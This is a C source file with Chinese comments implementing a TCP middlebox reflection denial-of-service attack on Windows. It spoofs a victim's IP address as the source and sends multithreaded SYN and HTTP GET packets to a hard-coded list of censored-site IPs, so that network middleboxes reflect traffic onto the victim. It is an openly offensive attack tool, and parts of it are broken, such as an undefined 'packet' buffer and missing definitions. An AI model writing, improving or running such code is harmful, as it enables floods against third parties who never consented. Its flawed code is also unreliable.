/* mra_win.c - TCP中间件反射攻击Windows实现 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <pcap.h>
#include <winsock2.h>
#include <Windows.h>
#include <process.h>

#pragma comment(lib, "wpcap.lib")
#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib, "wpcap.lib")

// 编译说明注释
/*
 * 编译命令：
 * cl.exe mra_win.c /I "C:\Program Files\Npcap\Include" /link /LIBPATH:"C:\Program Files\Npcap\Lib\x64"
 * 注意：需要管理员权限运行且安装Npcap 1.70+驱动
*/

/* 全局常量定义 */
const char* forbidden_websites[] = {
    "66.254.114.79", "157.240.13.35", "66.254.114.41", "98.143.146.7"
};

/* IP头结构体 */
typedef struct ip_header {
    unsigned char  ver_ihl;        // 版本（4 bits） + 头长（4 bits）
    unsigned char  tos;            // 服务类型
    unsigned short total_length;   // 总长度
    unsigned short ident;          // 标识
    unsigned short flags_fo;       // 标志（3 bits） + 片偏移（13 bits）
    unsigned char  ttl;            // 生存时间
    unsigned char  protocol;       // 协议
    unsigned short checksum;       // 校验和
    unsigned int   src_addr;       // 源地址
    unsigned int   dst_addr;       // 目的地址
} IP_HEADER;

/* TCP头结构体 */
typedef struct tcp_header {
    unsigned short src_port;    // 源端口
    unsigned short dst_port;    // 目的端口
    unsigned int   seq_num;    // 序列号
    unsigned int   ack_num;    // 确认号
    unsigned char  data_off;   // 数据偏移（4 bits） + 保留（4 bits）
    unsigned char  flags;      // 标志位
    unsigned short window;     // 窗口大小
    unsigned short checksum;    // 校验和
    unsigned short urg_ptr;     // 紧急指针
} TCP_HEADER;

/* 数据包生成参数结构体 */
typedef struct {
    int oc;
    const char* target_ip;
    int packets_per_thread;
    int thread_id;
} GEN_PARAMS;

/* 计算校验和辅助函数 */
unsigned short checksum(unsigned short *buffer, int length) {
    unsigned long sum = 0;
    while (length-- > 0) {
        sum += *buffer++;
        if (sum & 0xFFFF0000) {
            sum &= 0xFFFF;
            sum++;
        }
    }
    return (unsigned short)(~sum);
}

/* 数据包生成线程函数 */
unsigned __stdcall generate(void* params) {
    GEN_PARAMS* gp = (GEN_PARAMS*)params;
    pcap_t* fp;
    char errbuf[PCAP_ERRBUF_SIZE];
    
    // 打开网络设备（需要管理员权限）
    if ((fp = pcap_open_live(NULL, 65536, 1, 1000, errbuf)) == NULL) {
        fprintf(stderr, "\n无法打开网络设备: %s", errbuf);
        return 1;
    }

    for (int i = 0; i < gp->packets_per_thread; i++) {
        // 随机选择目标网站
        const char* dst_ip = forbidden_websites[rand() % 4];
        
        // 构造SYN包
        IP_HEADER ip;
        TCP_HEADER tcp;
        // 构造IP头部
        ip.ver_ihl = 0x45;
        ip.tos = 0;
        ip.total_length = htons(sizeof(IP_HEADER) + sizeof(TCP_HEADER));
        ip.ident = htons(rand());
        ip.flags_fo = 0x4000; // DF标记
        ip.ttl = 255;
        ip.protocol = IPPROTO_TCP;
        ip.src_addr = inet_addr(gp->target_ip);
        ip.dst_addr = inet_addr(dst_ip);
        ip.checksum = 0;
        ip.checksum = checksum((unsigned short*)&ip, sizeof(IP_HEADER));

        // 构造TCP SYN头部
        tcp.src_port = htons(rand() % 49152 + 1024);
        tcp.dst_port = htons(80);
        tcp.seq_num = htonl(rand());
        tcp.ack_num = 0;
        tcp.data_off = (sizeof(TCP_HEADER)/4) << 4;
        tcp.flags = TH_SYN;
        tcp.window = htons(64240);
        tcp.checksum = 0;
        tcp.urg_ptr = 0;

        // 计算TCP校验和伪头部
        struct {
            u_int32_t src;
            u_int32_t dst;
            u_char zero;
            u_char protocol;
            u_short tcp_len;
        } pseudo_header;

        pseudo_header.src = ip.src_addr;
        pseudo_header.dst = ip.dst_addr;
        pseudo_header.zero = 0;
        pseudo_header.protocol = IPPROTO_TCP;
        pseudo_header.tcp_len = htons(sizeof(TCP_HEADER));

        char tcp_segment[sizeof(pseudo_header) + sizeof(TCP_HEADER)];
        memcpy(tcp_segment, &pseudo_header, sizeof(pseudo_header));
        memcpy(tcp_segment + sizeof(pseudo_header), &tcp, sizeof(TCP_HEADER));
        tcp.checksum = checksum((unsigned short*)tcp_segment, sizeof(tcp_segment));
        
        // 发送原始数据包
        pcap_sendpacket(fp, (u_char*)packet, sizeof(packet));
        
        // 构造ACK+PSH包
        TCP_HEADER ack_tcp;
        ack_tcp.src_port = tcp.src_port;
        ack_tcp.dst_port = tcp.dst_port;
        ack_tcp.seq_num = htonl(ntohl(tcp.seq_num) + 1);
        ack_tcp.ack_num = htonl(rand());
        ack_tcp.data_off = tcp.data_off;
        ack_tcp.flags = TH_ACK | TH_PUSH;
        ack_tcp.window = tcp.window;
        ack_tcp.checksum = 0;
        ack_tcp.urg_ptr = 0;

        // HTTP载荷
        char http_payload[128];
        snprintf(http_payload, sizeof(http_payload),
            "GET / HTTP/1.1\r\nHost: %s\r\n\r\n", dst_ip);

        // 更新IP包长度
        ip.total_length = htons(sizeof(IP_HEADER) + sizeof(TCP_HEADER) + strlen(http_payload));
        ip.checksum = 0;
        ip.checksum = checksum((unsigned short*)&ip, sizeof(IP_HEADER));

        // 重新计算TCP校验和
        pseudo_header.tcp_len = htons(sizeof(TCP_HEADER) + strlen(http_payload));
        char ack_segment[sizeof(pseudo_header) + sizeof(TCP_HEADER) + strlen(http_payload)];
        memcpy(ack_segment, &pseudo_header, sizeof(pseudo_header));
        memcpy(ack_segment + sizeof(pseudo_header), &ack_tcp, sizeof(TCP_HEADER));
        memcpy(ack_segment + sizeof(pseudo_header) + sizeof(TCP_HEADER), http_payload, strlen(http_payload));
        ack_tcp.checksum = checksum((unsigned short*)ack_segment, sizeof(ack_segment));

        // 构造完整数据包
        u_char ack_packet[sizeof(IP_HEADER) + sizeof(TCP_HEADER) + strlen(http_payload)];
        memcpy(ack_packet, &ip, sizeof(IP_HEADER));
        memcpy(ack_packet + sizeof(IP_HEADER), &ack_tcp, sizeof(TCP_HEADER));
        memcpy(ack_packet + sizeof(IP_HEADER) + sizeof(TCP_HEADER), http_payload, strlen(http_payload));
        pcap_sendpacket(fp, ack_packet, sizeof(ack_packet));
    }
    pcap_close(fp);
    return 0;
}

/* 主函数 */
int main(int argc, char* argv[]) {
    // 检查管理员权限
    if (!IsUserAnAdmin()) {
        printf("请使用管理员权限运行！\n");
        return 1;
    }

    // 参数校验
    if (argc != 3) {
        printf("用法: mra_win.exe <持续时间(秒)> <目标IP>\n");
        return 1;
    }

    // 初始化随机种子
    srand((unsigned int)time(NULL));
    
    // 线程参数设置
    SYSTEM_INFO sysInfo;
    GetSystemInfo(&sysInfo);
    int thread_count = sysInfo.dwNumberOfProcessors;
    HANDLE* threads = (HANDLE*)malloc(thread_count * sizeof(HANDLE));
    GEN_PARAMS* params = (GEN_PARAMS*)malloc(thread_count * sizeof(GEN_PARAMS));

    // 创建工作线程
    for (int i = 0; i < thread_count; i++) {
        params[i].oc = 100;
        params[i].target_ip = argv[2];
        params[i].packets_per_thread = 400 / thread_count;
        params[i].thread_id = i;
        threads[i] = (HANDLE)_beginthreadex(NULL, 0, generate, &params[i], 0, NULL);
    }

    // 等待线程完成
    WaitForMultipleObjects(thread_count, threads, TRUE, INFINITE);

    // 资源清理
    free(threads);
    free(params);

    // 持续攻击时间控制
    printf("\n攻击持续中...");
    Sleep(atoi(argv[1]) * 1000);
    printf("\n攻击完成！\n");
    
    return 0;
}